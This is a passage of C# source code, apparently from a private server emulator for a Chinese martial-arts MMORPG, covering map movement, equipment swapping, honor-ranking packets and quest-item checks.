					case 32101:
					case 32102:
					case 32103:
					case 32104:
					case 32105:
					case 32106:
					case 32107:
					case 32108:
					case 32109:
						if (是否为药品世外() != 0)
						{
							系统提示("必须携带[通行手环]buff才可进入世外武林。");
							return;
						}
						移动(0f, 0f, 15f, num2);
						break;
					case 65535:
						移动(301f, 1755f, 15f, 101);
						break;
					}
					获取复查范围玩家();
					获取复查范围Npc();
					获取复查范围地面物品();
					break;
				}
				case 3:
				{
					string hex = "AA551E0000009100100001000000010000000100000000000000000000000000000055AA";
					byte[] array2 = Converter.hexStringToByte(hex);
					打开仓库中 = false;
					Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array2, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array2, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array2, 14, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
					break;
				}
				}
			}
			catch (Exception)
			{
				MainForm.WriteLine(1, "修炼之地移动数据出错");
			}
		}

		public void 参加王者之战(byte[] data, int length)
		{
			封包修改(data, length);
			BitConverter.ToInt32(data, 11);
		}

		public void 更换辅助装备()
		{
			try
			{
				int num = 100;
				if (退出中)
				{
					MainForm.WriteLine(6, "退出复制BUG [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] ");
				}
				else
				{
					if (打开仓库中 || (个人商店 != null && 个人商店.个人商店是否开启))
					{
						return;
					}
					for (int i = 0; i < 14; i++)
					{
						if (BitConverter.ToInt32(辅助装备栏装备[i].物品ID, 0) == 0)
						{
							continue;
						}
						byte[] 物品_byte = new byte[World.数据库单个物品大小];
						物品类 物品类2 = 辅助装备栏装备[i];
						if (BitConverter.ToInt32(物品类2.物品ID, 0) == 0 || 物品类2.锁定)
						{
							continue;
						}
						ItmeClass itmeClass = World.Itme[BitConverter.ToInt32(辅助装备栏装备[i].物品ID, 0)];
						if (itmeClass.FLD_LEVEL <= base.Player_Level && (itmeClass.FLD_ZX == 0 || itmeClass.FLD_ZX == base.Player_Zx) && (itmeClass.FLD_RESIDE1 == 0 || itmeClass.FLD_RESIDE1 == base.Player_Job) && (itmeClass.FLD_JOB_LEVEL == 0 || itmeClass.FLD_JOB_LEVEL <= base.Player_Job_leve) && (itmeClass.FLD_SEX == 0 || itmeClass.FLD_SEX == base.Player_Sex) && (itmeClass.FLD_XWJD < 1 || itmeClass.FLD_XWJD <= base.武勋阶段) && itmeClass.FLD_RESIDE2 >= 1 && itmeClass.FLD_RESIDE2 <= 15 && (i != 13 || 检查门甲条件(itmeClass.FLD_PID)))
						{
							if (BitConverter.ToInt32(装备栏已穿装备[i].物品ID, 0) == 0)
							{
								装备栏已穿装备[i].物品_byte = 辅助装备栏装备[i].物品_byte;
								辅助装备栏装备[i].物品_byte = 物品_byte;
								更换装备位置(123, i, 0, i, 装备栏已穿装备[i].物品_byte, BitConverter.ToInt32(装备栏已穿装备[i].物品数量, 0));
							}
							else
							{
								byte[] 物品_byte2 = 装备栏已穿装备[i].物品_byte;
								装备栏已穿装备[i].物品_byte = 辅助装备栏装备[i].物品_byte;
								辅助装备栏装备[i].物品_byte = 物品_byte2;
								更换装备位置(123, i, 0, i, 装备栏已穿装备[i].物品_byte, BitConverter.ToInt32(装备栏已穿装备[i].物品数量, 0));
							}
							num += 100;
							Thread.Sleep(num);
						}
					}
					更新人物数据(this);
					更新装备效果();
					计算人物装备数据();
					更新武功和状态();
					更新HP_MP_SP();
					return;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "更换装备出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 辅助装备切换(byte[] data, int length)
		{
			封包修改(data, length);
			Thread thread = new Thread(更换辅助装备)
			{
				Name = "Timer Thread"
			};
			thread.Start();
		}

		public void 打开荣誉殿堂(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			int num = 封包数据[11];
			using 发包类 发包类 = new 发包类();
			switch (封包数据[14])
			{
			case 1:
				switch (num)
				{
				case 1:
					if (World.势力排名数据.Count != 0)
					{
						发包类.Write4(World.势力排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int num6 = 0; num6 < World.势力排名数据.Count; num6++)
						{
							if (World.势力排名数据[num6] != null)
							{
								发包类.WriteName(World.势力排名数据[num6].势力人物名);
								发包类.WriteName(World.势力排名数据[num6].势力帮派名);
								发包类.Write2(World.势力排名数据[num6].势力职业);
								发包类.Write2(0);
								发包类.Write2(World.势力排名数据[num6].势力正邪);
								发包类.Write2(World.势力排名数据[num6].势力人物等级);
								发包类.Write2(0);
								发包类.Write8(World.势力排名数据[num6].势力荣誉点);
								发包类.Write8(num6 + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.势力排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 2:
					if (World.武林排名数据.Count != 0)
					{
						发包类.Write4(World.武林排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int num3 = 0; num3 < World.武林排名数据.Count; num3++)
						{
							if (World.武林排名数据[num3] != null)
							{
								发包类.WriteName(World.武林排名数据[num3].武林人物名);
								发包类.WriteName(World.武林排名数据[num3].武林帮派名);
								发包类.Write2(World.武林排名数据[num3].武林职业);
								发包类.Write2(0);
								发包类.Write2(World.武林排名数据[num3].武林正邪);
								发包类.Write2(World.武林排名数据[num3].武林人物等级);
								发包类.Write2(0);
								发包类.Write8(World.武林排名数据[num3].武林荣誉点);
								发包类.Write8(num3 + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.武林排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 3:
					if (World.门派排名数据.Count != 0)
					{
						发包类.Write4(World.门派排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int num4 = 0; num4 < World.门派排名数据.Count; num4++)
						{
							if (World.门派排名数据[num4] != null)
							{
								发包类.WriteName(World.门派排名数据[num4].门派人物名);
								发包类.WriteName(World.门派排名数据[num4].门派帮派名);
								发包类.Write2(World.门派排名数据[num4].门派职业);
								发包类.Write2(0);
								发包类.Write2(World.门派排名数据[num4].门派正邪);
								发包类.Write2(World.门派排名数据[num4].门派人物等级);
								发包类.Write2(0);
								发包类.Write8(World.门派排名数据[num4].门派荣誉点);
								发包类.Write8(num4 + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.门派排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 4:
					if (World.武林血战排行数据.Count != 0)
					{
						发包类.Write4(World.武林血战排行数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int num5 = 0; num5 < World.武林血战排行数据.Count; num5++)
						{
							if (World.武林血战排行数据[num5] != null)
							{
								发包类.WriteName(World.武林血战排行数据[num5].人物名);
								发包类.WriteName(World.武林血战排行数据[num5].帮派);
								发包类.Write2(World.武林血战排行数据[num5].职业);
								发包类.Write2(0);
								发包类.Write2(World.武林血战排行数据[num5].势力);
								发包类.Write2(World.武林血战排行数据[num5].等级);
								发包类.Write2(0);
								发包类.Write8(World.武林血战排行数据[num5].分数);
								发包类.Write8(num5 + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.武林血战排行数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 5:
					if (World.讨伐排名数据.Count != 0)
					{
						发包类.Write4(World.讨伐排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int num7 = 0; num7 < World.讨伐排名数据.Count; num7++)
						{
							if (World.讨伐排名数据[num7] != null)
							{
								发包类.WriteName(World.讨伐排名数据[num7].讨伐人物名);
								发包类.WriteName(World.讨伐排名数据[num7].讨伐帮派名);
								发包类.Write2(World.讨伐排名数据[num7].讨伐职业);
								发包类.Write2(0);
								发包类.Write2(World.讨伐排名数据[num7].讨伐正邪);
								发包类.Write2(World.讨伐排名数据[num7].讨伐人物等级);
								发包类.Write2(0);
								发包类.Write8(World.讨伐排名数据[num7].讨伐荣誉点);
								发包类.Write8(num7 + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.讨伐排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 6:
					if (World.杀人排行数据.Count != 0)
					{
						发包类.Write4(World.杀人排行数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int num2 = 0; num2 < World.杀人排行数据.Count; num2++)
						{
							if (World.杀人排行数据[num2] != null)
							{
								发包类.WriteName(World.杀人排行数据[num2].人物名);
								发包类.WriteName(World.杀人排行数据[num2].帮派);
								发包类.Write2(World.杀人排行数据[num2].职业);
								发包类.Write2(0);
								发包类.Write2(World.杀人排行数据[num2].势力);
								发包类.Write2(World.杀人排行数据[num2].等级);
								发包类.Write2(0);
								发包类.Write8(World.杀人排行数据[num2].分数);
								发包类.Write8(num2 + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.武林血战排行数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				}
				break;
			case 2:
			case 3:
				switch (num)
				{
				case 1:
					if (World.势力排名数据.Count > 0)
					{
						发包类.Write4(World.势力排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int m = 0; m < World.势力排名数据.Count; m++)
						{
							if (World.势力排名数据[m] != null)
							{
								发包类.WriteName(World.势力排名数据[m].势力人物名);
								发包类.WriteName(World.势力排名数据[m].势力帮派名);
								发包类.Write2(World.势力排名数据[m].势力职业);
								发包类.Write2(0);
								发包类.Write2(World.势力排名数据[m].势力正邪);
								发包类.Write2(World.势力排名数据[m].势力人物等级);
								发包类.Write2(0);
								发包类.Write8(World.势力排名数据[m].势力荣誉点);
								发包类.Write8(m + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.势力排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 2:
					if (World.武林排名数据.Count > 0)
					{
						发包类.Write4(World.武林排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int j = 0; j < World.武林排名数据.Count; j++)
						{
							if (World.武林排名数据[j] != null)
							{
								发包类.WriteName(World.武林排名数据[j].武林人物名);
								发包类.WriteName(World.武林排名数据[j].武林帮派名);
								发包类.Write2(World.武林排名数据[j].武林职业);
								发包类.Write2(0);
								发包类.Write2(World.武林排名数据[j].武林正邪);
								发包类.Write2(World.武林排名数据[j].武林人物等级);
								发包类.Write2(0);
								发包类.Write8(World.武林排名数据[j].武林荣誉点);
								发包类.Write8(j + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.武林排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 3:
					if (World.门派排名数据.Count > 0)
					{
						发包类.Write4(World.门派排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int k = 0; k < World.门派排名数据.Count; k++)
						{
							if (World.门派排名数据[k] != null)
							{
								发包类.WriteName(World.门派排名数据[k].门派人物名);
								发包类.WriteName(World.门派排名数据[k].门派帮派名);
								发包类.Write2(World.门派排名数据[k].门派职业);
								发包类.Write2(0);
								发包类.Write2(World.门派排名数据[k].门派正邪);
								发包类.Write2(World.门派排名数据[k].门派人物等级);
								发包类.Write2(0);
								发包类.Write8(World.门派排名数据[k].门派荣誉点);
								发包类.Write8(k + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.门派排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 4:
					if (World.武林血战排行数据.Count != 0)
					{
						发包类.Write4(World.武林血战排行数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int l = 0; l < World.武林血战排行数据.Count; l++)
						{
							if (World.武林血战排行数据[l] != null)
							{
								发包类.WriteName(World.武林血战排行数据[l].人物名);
								发包类.WriteName(World.武林血战排行数据[l].帮派);
								发包类.Write2(World.武林血战排行数据[l].职业);
								发包类.Write2(0);
								发包类.Write2(World.武林血战排行数据[l].势力);
								发包类.Write2(World.武林血战排行数据[l].等级);
								发包类.Write2(0);
								发包类.Write8(World.武林血战排行数据[l].分数);
								发包类.Write8(l + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.武林血战排行数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 5:
					if (World.讨伐排名数据.Count > 0)
					{
						发包类.Write4(World.讨伐排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int n = 0; n < World.讨伐排名数据.Count; n++)
						{
							if (World.讨伐排名数据[n] != null)
							{
								发包类.WriteName(World.讨伐排名数据[n].讨伐人物名);
								发包类.WriteName(World.讨伐排名数据[n].讨伐帮派名);
								发包类.Write2(World.讨伐排名数据[n].讨伐职业);
								发包类.Write2(0);
								发包类.Write2(World.讨伐排名数据[n].讨伐正邪);
								发包类.Write2(World.讨伐排名数据[n].讨伐人物等级);
								发包类.Write2(0);
								发包类.Write8(World.讨伐排名数据[n].讨伐荣誉点);
								发包类.Write8(n + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.讨伐排名数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				case 6:
					if (World.杀人排行数据.Count != 0)
					{
						发包类.Write4(World.杀人排行数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						for (int i = 0; i < World.杀人排行数据.Count; i++)
						{
							if (World.杀人排行数据[i] != null)
							{
								发包类.WriteName(World.杀人排行数据[i].人物名);
								发包类.WriteName(World.杀人排行数据[i].帮派);
								发包类.Write2(World.杀人排行数据[i].职业);
								发包类.Write2(0);
								发包类.Write2(World.杀人排行数据[i].势力);
								发包类.Write2(World.杀人排行数据[i].等级);
								发包类.Write2(0);
								发包类.Write8(World.杀人排行数据[i].分数);
								发包类.Write8(i + 1);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					else
					{
						发包类.Write4(World.杀人排行数据.Count);
						发包类.Write(0);
						发包类.Write(num);
						发包类.Write2(0);
						发包类.Write4(1);
						发包类.WriteName("");
						发包类.WriteName("");
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write2(0);
						发包类.Write8(0L);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 23041, base.人物全服ID);
						}
					}
					break;
				}
				break;
			}
		}

		public void 荣誉排行前三名(byte[] 封包数据, int 封包大小)
		{
			int num = 封包数据[11];
			using 发包类 发包类 = new 发包类();
			switch (num)
			{
			case 1:
			{
				for (int l = 0; l < World.势力排名数据.Count && l <= 3; l++)
				{
					switch (l)
					{
					default:
						if (l == 2 && World.势力排名数据[l].势力人物名 != null)
						{
							byte[] array3 = 得到更新人物排名数据(World.势力排名数据[l].势力人物名, World.势力排名数据[l].势力帮派名, World.势力排名数据[l].势力正邪, World.势力排名数据[l].势力人物等级, World.势力排名数据[l].势力职业, World.势力排名数据[l].势力转职, 3);
							发包类.Write(array3, 0, array3.Length);
						}
						break;
					case 1:
						if (World.势力排名数据[l].势力人物名 != null)
						{
							byte[] array4 = 得到更新人物排名数据(World.势力排名数据[l].势力人物名, World.势力排名数据[l].势力帮派名, World.势力排名数据[l].势力正邪, World.势力排名数据[l].势力人物等级, World.势力排名数据[l].势力职业, World.势力排名数据[l].势力转职, 2);
							发包类.Write(array4, 0, array4.Length);
						}
						break;
					case 0:
						if (World.势力排名数据[l].势力人物名 != null)
						{
							byte[] array2 = 得到更新人物排名数据(World.势力排名数据[l].势力人物名, World.势力排名数据[l].势力帮派名, World.势力排名数据[l].势力正邪, World.势力排名数据[l].势力人物等级, World.势力排名数据[l].势力职业, World.势力排名数据[l].势力转职, 1);
							发包类.Write(array2, 0, array2.Length);
						}
						break;
					}
				}
				break;
			}
			case 2:
			{
				for (int n = 0; n < World.武林排名数据.Count && n <= 3; n++)
				{
					switch (n)
					{
					default:
						if (n == 2 && World.武林排名数据[n].武林人物名 != null)
						{
							byte[] array9 = 得到更新人物排名数据(World.武林排名数据[n].武林人物名, World.武林排名数据[n].武林帮派名, World.武林排名数据[n].武林正邪, World.武林排名数据[n].武林人物等级, World.武林排名数据[n].武林职业, World.武林排名数据[n].武林转职, 3);
							发包类.Write(array9, 0, array9.Length);
						}
						break;
					case 1:
						if (World.武林排名数据[n].武林人物名 != null)
						{
							byte[] array10 = 得到更新人物排名数据(World.武林排名数据[n].武林人物名, World.武林排名数据[n].武林帮派名, World.武林排名数据[n].武林正邪, World.武林排名数据[n].武林人物等级, World.武林排名数据[n].武林职业, World.武林排名数据[n].武林转职, 2);
							发包类.Write(array10, 0, array10.Length);
						}
						break;
					case 0:
						if (World.武林排名数据[n].武林人物名 != null)
						{
							byte[] array8 = 得到更新人物排名数据(World.武林排名数据[n].武林人物名, World.武林排名数据[n].武林帮派名, World.武林排名数据[n].武林正邪, World.武林排名数据[n].武林人物等级, World.武林排名数据[n].武林职业, World.武林排名数据[n].武林转职, 1);
							发包类.Write(array8, 0, array8.Length);
						}
						break;
					}
				}
				break;
			}
			case 3:
			{
				for (int j = 0; j < World.门派排名数据.Count && j <= 3; j++)
				{
					switch (j)
					{
					default:
						if (j == 2 && World.门派排名数据[j].门派人物名 != null)
						{
							byte[] array14 = 得到更新人物排名数据(World.门派排名数据[j].门派人物名, World.门派排名数据[j].门派帮派名, World.门派排名数据[j].门派正邪, World.门派排名数据[j].门派人物等级, World.门派排名数据[j].门派职业, World.门派排名数据[j].门派转职, 3);
							发包类.Write(array14, 0, array14.Length);
						}
						break;
					case 1:
						if (World.门派排名数据[j].门派人物名 != null)
						{
							byte[] array15 = 得到更新人物排名数据(World.门派排名数据[j].门派人物名, World.门派排名数据[j].门派帮派名, World.门派排名数据[j].门派正邪, World.门派排名数据[j].门派人物等级, World.门派排名数据[j].门派职业, World.门派排名数据[j].门派转职, 2);
							发包类.Write(array15, 0, array15.Length);
						}
						break;
					case 0:
						if (World.门派排名数据[j].门派人物名 != null)
						{
							byte[] array13 = 得到更新人物排名数据(World.门派排名数据[j].门派人物名, World.门派排名数据[j].门派帮派名, World.门派排名数据[j].门派正邪, World.门派排名数据[j].门派人物等级, World.门派排名数据[j].门派职业, World.门派排名数据[j].门派转职, 1);
							发包类.Write(array13, 0, array13.Length);
						}
						break;
					}
				}
				break;
			}
			case 4:
			{
				for (int m = 0; m < World.武林血战排行数据.Count && m <= 3; m++)
				{
					switch (m)
					{
					default:
						if (m == 2 && World.武林血战排行数据[m].人物名 != null)
						{
							byte[] array6 = 得到更新人物排名数据(World.武林血战排行数据[m].人物名, World.武林血战排行数据[m].帮派, World.武林血战排行数据[m].势力, World.武林血战排行数据[m].等级, World.武林血战排行数据[m].职业, 0, 3);
							发包类.Write(array6, 0, array6.Length);
						}
						break;
					case 1:
						if (World.武林血战排行数据[m].人物名 != null)
						{
							byte[] array7 = 得到更新人物排名数据(World.武林血战排行数据[m].人物名, World.武林血战排行数据[m].帮派, World.武林血战排行数据[m].势力, World.武林血战排行数据[m].等级, World.武林血战排行数据[m].职业, 0, 2);
							发包类.Write(array7, 0, array7.Length);
						}
						break;
					case 0:
						if (World.武林血战排行数据[m].人物名 != null)
						{
							byte[] array5 = 得到更新人物排名数据(World.武林血战排行数据[m].人物名, World.武林血战排行数据[m].帮派, World.武林血战排行数据[m].势力, World.武林血战排行数据[m].等级, World.武林血战排行数据[m].职业, 0, 1);
							发包类.Write(array5, 0, array5.Length);
						}
						break;
					}
				}
				break;
			}
			case 5:
			{
				for (int k = 0; k < World.讨伐排名数据.Count && k <= 3; k++)
				{
					switch (k)
					{
					default:
						if (k == 2 && World.讨伐排名数据[k].讨伐人物名 != null)
						{
							byte[] array17 = 得到更新人物排名数据(World.讨伐排名数据[k].讨伐人物名, World.讨伐排名数据[k].讨伐帮派名, World.讨伐排名数据[k].讨伐正邪, World.讨伐排名数据[k].讨伐人物等级, World.讨伐排名数据[k].讨伐职业, World.讨伐排名数据[k].讨伐转职, 3);
							发包类.Write(array17, 0, array17.Length);
						}
						break;
					case 1:
						if (World.讨伐排名数据[k].讨伐人物名 != null)
						{
							byte[] array18 = 得到更新人物排名数据(World.讨伐排名数据[k].讨伐人物名, World.讨伐排名数据[k].讨伐帮派名, World.讨伐排名数据[k].讨伐正邪, World.讨伐排名数据[k].讨伐人物等级, World.讨伐排名数据[k].讨伐职业, World.讨伐排名数据[k].讨伐转职, 2);
							发包类.Write(array18, 0, array18.Length);
						}
						break;
					case 0:
						if (World.讨伐排名数据[k].讨伐人物名 != null)
						{
							byte[] array16 = 得到更新人物排名数据(World.讨伐排名数据[k].讨伐人物名, World.讨伐排名数据[k].讨伐帮派名, World.讨伐排名数据[k].讨伐正邪, World.讨伐排名数据[k].讨伐人物等级, World.讨伐排名数据[k].讨伐职业, World.讨伐排名数据[k].讨伐转职, 1);
							发包类.Write(array16, 0, array16.Length);
						}
						break;
					}
				}
				break;
			}
			case 6:
			{
				for (int i = 0; i < World.杀人排行数据.Count && i <= 3; i++)
				{
					switch (i)
					{
					default:
						if (i == 2 && World.杀人排行数据[i].人物名 != null)
						{
							byte[] array11 = 得到更新人物排名数据(World.杀人排行数据[i].人物名, World.杀人排行数据[i].帮派, World.杀人排行数据[i].势力, World.杀人排行数据[i].等级, World.杀人排行数据[i].职业, 0, 3);
							发包类.Write(array11, 0, array11.Length);
						}
						break;
					case 1:
						if (World.杀人排行数据[i].人物名 != null)
						{
							byte[] array12 = 得到更新人物排名数据(World.杀人排行数据[i].人物名, World.杀人排行数据[i].帮派, World.杀人排行数据[i].势力, World.杀人排行数据[i].等级, World.杀人排行数据[i].职业, 0, 2);
							发包类.Write(array12, 0, array12.Length);
						}
						break;
					case 0:
						if (World.杀人排行数据[i].人物名 != null)
						{
							byte[] array = 得到更新人物排名数据(World.杀人排行数据[i].人物名, World.杀人排行数据[i].帮派, World.杀人排行数据[i].势力, World.杀人排行数据[i].等级, World.杀人排行数据[i].职业, 0, 1);
							发包类.Write(array, 0, array.Length);
						}
						break;
					}
				}
				break;
			}
			}
			if (发包类 != null && base.Client != null)
			{
				base.Client.SendPak(发包类, 5635, base.人物全服ID);
			}
		}

		public void 增加物品Script(int 物品ID, int 空位, int 数量)
		{
			byte[] array = new byte[56];
			if (World.Itme.TryGetValue(物品ID, out var value))
			{
				Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC0), 0, array, 0, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC1), 0, array, 4, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC2), 0, array, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC3), 0, array, 12, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC4), 0, array, 16, 4);
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(物品ID), 空位, BitConverter.GetBytes(数量), array);
			}
		}

		public bool CheckQuestItem(ConcurrentDictionary<int, 阶段需要物品类> 需要物品)
		{
			try
			{
				foreach (阶段需要物品类 value in 需要物品.Values)
				{
					if (!CheckItem(value.物品ID, value.物品总数))
					{
						return false;
					}
				}
				return true;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "检查任务需要物品出错--" + ex.Message);
				return false;
			}
		}

		public bool CheckItem(int 物品ID, int 物品数量)
		{
			bool result = false;
			if (World.Itme.TryGetValue(物品ID, out var value))
			{
				if (value.FLD_QUESTITEM == 1)
				{
					for (int i = 0; i < 任务物品.Length; i++)
					{
						if (任务物品[i].物品ID == 物品ID && 任务物品[i].物品数量 >= 物品数量)
						{
							result = true;
						}
					}
				}
				else
				{
					switch (物品ID)
					{
					case 909000001:
						if (base.人物经验 >= 物品数量)
						{
							result = true;
						}
						break;
					case 909000002:
						if (base.Player_ExpErience >= 物品数量)
						{
							result = true;
						}
						break;
					default:
					{
						物品类[] 装备栏包裹 = base.装备栏包裹;
						物品类[] array = 装备栏包裹;
						物品类[] array2 = array;
						foreach (物品类 物品类2 in array2)
						{
							if (物品类2.Get物品ID == 物品ID && 物品类2.Get物品数量 >= 物品数量)
							{
								result = true;
							}
						}
						break;
					}
					case 909000004:
						if (base.Player_Money >= 物品数量)
						{
							result = true;
						}
